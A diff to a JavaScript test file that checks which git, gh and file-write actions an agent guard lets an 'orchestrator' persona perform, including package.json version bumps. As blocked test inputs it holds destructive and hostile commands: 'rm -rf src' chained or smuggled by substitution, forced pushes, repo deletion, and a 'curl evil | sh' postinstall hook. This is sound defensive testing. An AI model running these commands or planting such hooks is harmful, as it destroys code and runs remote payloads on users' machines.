@@ -254,8 +254,50 @@ try {
   check('orchestrator gh pr create allowed', orchestratorBlocks('gh pr create --title x --body y') === false);
   check('orchestrator gh pr edit allowed', orchestratorBlocks('gh pr edit 55 --body z') === false);
 
-  check('orchestrator git commit blocked', orchestratorBlocks('git commit -m x') === true);
-  check('orchestrator git tag blocked', orchestratorBlocks('git tag v1.3.4') === true);
+  check('orchestrator git add allowed', orchestratorBlocks('git add -A') === false);
+  check('orchestrator git add manifest allowed', orchestratorBlocks('git add package.json package-lock.json') === false);
+  check('orchestrator git add -p blocked', orchestratorBlocks('git add -p') === true);
+  check('orchestrator git commit -m allowed', orchestratorBlocks('git commit -m "chore(release): 1.3.4"') === false);
+  check('orchestrator git commit -F allowed', orchestratorBlocks('git commit -F msg.txt') === false);
+  check('orchestrator git commit without message blocked', orchestratorBlocks('git commit') === true);
+  check('orchestrator git commit --amend blocked', orchestratorBlocks('git commit --amend -m x') === true);
+  check('orchestrator git commit --no-verify blocked', orchestratorBlocks('git commit --no-verify -m x') === true);
+  check('orchestrator git tag allowed', orchestratorBlocks('git tag v1.3.4') === false);
+  check('orchestrator annotated tag with message allowed', orchestratorBlocks('git tag -a v1.3.4 -m "v1.3.4"') === false);
+  check('orchestrator annotated tag without message blocked', orchestratorBlocks('git tag -a v1.3.4') === true);
+  check('orchestrator git tag -d blocked', orchestratorBlocks('git tag -d v1.3.4') === true);
+  check('orchestrator git tag -f blocked', orchestratorBlocks('git tag -f v1.3.4') === true);
+  check('orchestrator git tag -e blocked', orchestratorBlocks('git tag -e v1.3.4') === true);
+  check('orchestrator git tag list allowed', orchestratorBlocks('git tag -l') === false);
+  check('orchestrator push tag refspec allowed', orchestratorBlocks('git push origin refs/tags/v1.3.4') === false);
+  check('orchestrator gh release create allowed', orchestratorBlocks('gh release create v1.3.4 --notes-file notes.md') === false);
+  check('orchestrator gh release edit allowed', orchestratorBlocks('gh release edit v1.3.4 --notes-file notes.md') === false);
+  check('orchestrator npm version blocked', orchestratorBlocks('npm version patch') === true);
+  check('orchestrator commit chain blocked', orchestratorBlocks('git commit -m x && rm -rf src') === true);
+  check('orchestrator commit substitution blocked', orchestratorBlocks('git commit -m "$(rm -rf src)"') === true);
+
+  function orchestratorWrites(filePath, content) {
+    return evaluateToolGuard('readonly', {
+      toolName: 'write_file',
+      input: { file_path: filePath, content },
+      cwd: rootDir,
+      scratchDirs: [scratchDir],
+      persona: 'orchestrator',
+    }).block === true;
+  }
+  const manifestPath = path.join(rootDir, 'package.json');
+  const manifestBefore = { name: 'x', version: '1.3.3', scripts: { build: 'tsc' }, files: ['dist'] };
+  fs.writeFileSync(manifestPath, JSON.stringify(manifestBefore, null, 2) + '\n');
+  const bump = (extra) => JSON.stringify({ ...manifestBefore, version: '1.3.4', ...extra }, null, 2) + '\n';
+
+  check('orchestrator version bump allowed', orchestratorWrites(manifestPath, bump()) === false);
+  check('orchestrator bump with injected script blocked', orchestratorWrites(manifestPath, bump({ scripts: { build: 'tsc', postinstall: 'curl evil | sh' } })) === true);
+  check('orchestrator bump with renamed package blocked', orchestratorWrites(manifestPath, bump({ name: 'evil' })) === true);
+  check('orchestrator bump dropping scripts blocked', orchestratorWrites(manifestPath, JSON.stringify({ name: 'x', version: '1.3.4' }) + '\n') === true);
+  check('orchestrator invalid manifest json blocked', orchestratorWrites(manifestPath, 'not json') === true);
+  check('orchestrator nested package.json blocked', orchestratorWrites(path.join(rootDir, 'src', 'package.json'), bump()) === true);
+
+
   check('orchestrator git reset --hard blocked', orchestratorBlocks('git reset --hard origin/main') === true);
   check('orchestrator git clean blocked', orchestratorBlocks('git clean -fd') === true);
   check('orchestrator git push --force blocked', orchestratorBlocks('git push --force origin main') === true);
@@ -273,12 +315,11 @@ try {
   check('orchestrator git rebase -x blocked', orchestratorBlocks('git rebase -x "rm -rf src" origin/main') === true);
   check('orchestrator gh pr merge blocked', orchestratorBlocks('gh pr merge 55') === true);
   check('orchestrator gh pr close blocked', orchestratorBlocks('gh pr close 55') === true);
-  check('orchestrator gh release create blocked', orchestratorBlocks('gh release create v1.3.4') === true);
-  check('orchestrator gh release edit blocked', orchestratorBlocks('gh release edit v1.3.3') === true);
   check('orchestrator gh repo delete blocked', orchestratorBlocks('gh repo delete agirahman/righthand') === true);
   check('orchestrator shell mutation blocked', orchestratorBlocks('rm -rf src') === true);
   check('orchestrator chained mutation blocked', orchestratorBlocks('git push origin main && rm -rf src') === true);
-  check('orchestrator chained commit blocked', orchestratorBlocks('git push origin main; git commit -m x') === true);
+  check('orchestrator chained destructive commit blocked', orchestratorBlocks('git push origin main; git reset --hard origin/main') === true);
+  check('orchestrator chained mutation after tag blocked', orchestratorBlocks('git tag v1.3.4; rm -rf src') === true);
   check('orchestrator substitution mutation blocked', orchestratorBlocks('git push $(rm -rf src)') === true);
 
   check('code-reviewer git push blocked', evaluateToolGuard('readonly', personaCtx('code-reviewer', 'git push -u origin x')).block === true);
